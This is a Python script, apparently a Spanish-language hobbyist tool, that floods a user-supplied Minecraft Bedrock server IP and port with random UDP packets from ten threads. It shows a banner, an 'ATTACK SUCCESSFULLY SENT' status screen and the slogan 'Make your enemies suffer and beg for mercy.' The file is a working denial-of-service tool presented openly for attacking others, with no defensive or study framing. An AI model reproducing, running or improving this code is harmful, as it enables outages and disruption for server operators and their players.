import socket
import time
import os
import random
import threading

BLUE_DEG = [
    "\033[38;5;17m",
    "\033[38;5;18m",
    "\033[38;5;19m",
    "\033[38;5;20m",
    "\033[38;5;21m",
    "\033[38;5;27m",
    "\033[38;5;33m",
    "\033[38;5;39m",
    "\033[38;5;45m",
]
WHITE = "\033[97m"
GRAY = "\033[90m"
RESET = "\033[0m"
BOLD = "\033[1m"

# by @NexusTeam ( eduxz_gx )
ASCII_ART_LINES = [
" ███▄    █ ▓█████ ▒██   ██▒ █    ██   ██████     █    ██ ▓█████▄  ██▓███  ",
" ██ ▀█   █ ▓█   ▀ ▒▒ █ █ ▒░ ██  ▓██▒▒██    ▒     ██  ▓██▒▒██▀ ██▌▓██░  ██▒",
"▓██  ▀█ ██▒▒███   ░░  █   ░▓██  ▒██░░ ▓██▄      ▓██  ▒██░░██   █▌▓██░ ██▓▒",
"▓██▒  ▐▌██▒▒▓█  ▄  ░ █ █ ▒ ▓▓█  ░██░  ▒   ██▒   ▓▓█  ░██░░▓█▄   ▌▒██▄█▓▒ ▒",
"▒██░   ▓██░░▒████▒▒██▒ ▒██▒▒▒█████▓ ▒██████▒▒   ▒▒█████▓ ░▒████▓ ▒██▒ ░  ░",
"░ ▒░   ▒ ▒ ░░ ▒░ ░▒▒ ░ ░▓ ░░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░   ░▒▓▒ ▒ ▒  ▒▒▓  ▒ ▒▓▒░ ░  ░",
"░ ░░   ░ ▒░ ░ ░  ░░░   ░▒ ░░░▒░ ░ ░ ░ ░▒  ░ ░   ░░▒░ ░ ░  ░ ▒  ▒ ░▒ ░     ",
"   ░   ░ ░    ░    ░    ░   ░░░ ░ ░ ░  ░  ░      ░░░ ░ ░  ░ ░  ░ ░░       ",
"         ░    ░  ░ ░    ░     ░           ░        ░        ░             ",
"                                                          ░                "
]

def center(text, width=80):
    lines = text.splitlines() if isinstance(text, str) else text
    centered = []
    for line in lines:
        pad = max(0, (width - len(line)))
        centered.append(' ' * pad + line)
    return '\n'.join(centered)

# Función Para La API de MCPE Status ( IP/Port/Ping/Online/Motd )
def get_mcpe_status(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(1.5)
        payload = bytes([0x01]) + int(time.time() * 1000).to_bytes(8, 'big') + b'\x00' * 8
        sock.sendto(payload, (ip, port))
        data, _ = sock.recvfrom(2048)
        sock.close()

        if data.startswith(b'\x1c'):
            parts = data.split(b';')
            if len(parts) >= 6:
                motd = parts[1].decode(errors='ignore')[:25]
                online = parts[4].decode()
                maxp = parts[5].decode()
                ping = int((time.time() * 1000) - int.from_bytes(data[1:9], 'big'))
                return motd, f"{online}/{maxp}", f"{ping}ms"
        return "N/A", "N/A", "N/A"
    except:
        return "Offline", "N/A", "N/A"

# Forma De Ataque ( si quieres modifica o yo k se xd )
def attack(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        len_ = random.randint(256, 512)
        payload = os.urandom(len_)
        s.sendto(payload, (ip, port))

if __name__ == "__main__":
    os.system("clear")

    print(f"\n")
    for i, line in enumerate(ASCII_ART_LINES):
        color = BLUE_DEG[i % len(BLUE_DEG)]
        print(f"{color}{BOLD}{center(line, 80)}{RESET}")
    print(f"\n")

    print(f"{GRAY}{center('Codigo By @eduxz_gx', 80)}{RESET}\n\n")

    ip = input(f"{WHITE}IP → {RESET}").strip()
    port = int(input(f"{WHITE}PORT → {RESET}").strip())

    os.system("clear")

    start_time = time.time()

    for i in range(10):
        t = threading.Thread(target=attack, args=(ip, port), daemon=True)
        t.start()

    while True:
        elapsed = int(time.time() - start_time)
        motd, online, ping = get_mcpe_status(ip, port)

        os.system("clear")

        print(f"{BLUE_DEG[0]}{'═' * 78}{RESET}")
        print("")
        for i, char in enumerate("ATTACK SUCCESSFULLY SENT"):
            color = BLUE_DEG[(i // 5) % len(BLUE_DEG)]
            print(f"{color}{BOLD}{char}{RESET}", end='')
        print("\n")

        print("")
        for i, line in enumerate(ASCII_ART_LINES):
            color = BLUE_DEG[i % len(BLUE_DEG)]
            print(f"{color}{center(line, 80)}{RESET}")
        print("")

        print(f"{BLUE_DEG[2]}═══════════════════════════════════════════════════════════════════════════════{RESET}")
        print(f"{BLUE_DEG[3]}║ {GRAY}\"Make your enemies suffer and beg for mercy.\" - by eduxz_gx{RESET} {BLUE_DEG[3]}║{RESET}")
        print(f"{BLUE_DEG[4]}╠══════════════════════════════════════════════════════════════════════════════╣{RESET}")

        print(f"{BLUE_DEG[5]}║{RESET} Status     {BLUE_DEG[5]}│{WHITE} [ Attack Enviado ]{RESET}{' '*38}{BLUE_DEG[5]}║{RESET}")
        print(f"{BLUE_DEG[6]}║{RESET} IP de Servidor Atacado    {BLUE_DEG[6]}│{WHITE} [ {ip:<15} ]{RESET}{' '*38}{BLUE_DEG[6]}║{RESET}")
        print(f"{BLUE_DEG[7]}║{RESET} Puerto Del Servidor     {BLUE_DEG[7]}│{WHITE} [ {str(port):<6} ]{RESET}{' '*43}{BLUE_DEG[7]}║{RESET}")
        print(f"{BLUE_DEG[8]}║{RESET} Tiempo de Atque  {BLUE_DEG[8]}│{WHITE} [ {elapsed:3d} s ]{RESET}{' '*41}{BLUE_DEG[8]}║{RESET}")
        print(f"{BLUE_DEG[2]}║{RESET} Metodo De Ataque     {BLUE_DEG[2]}│{WHITE} [ game ]{RESET}{' '*47}{BLUE_DEG[2]}║{RESET}")
        print(f"{BLUE_DEG[3]}╠══════════════════════════════════════════════════════════════════════════════╣{RESET}")
        print(f"{BLUE_DEG[4]}║{RESET} MOTD       {BLUE_DEG[4]}│{WHITE} {motd}{RESET}{' ' * (35 - len(motd))}{BLUE_DEG[4]}║{RESET}")
        print(f"{BLUE_DEG[5]}║{RESET} ONLINE     {BLUE_DEG[5]}│{WHITE} {online}{RESET}{' ' * (35 - len(online))}{BLUE_DEG[5]}║{RESET}")
        print(f"{BLUE_DEG[6]}║{RESET} PING       {BLUE_DEG[6]}│{WHITE} {ping}{RESET}{' ' * (35 - len(ping))}{BLUE_DEG[6]}║{RESET}")
        print(f"{BLUE_DEG[7]}╚══════════════════════════════════════════════════════════════════════════════╝{RESET}")

        time.sleep(1)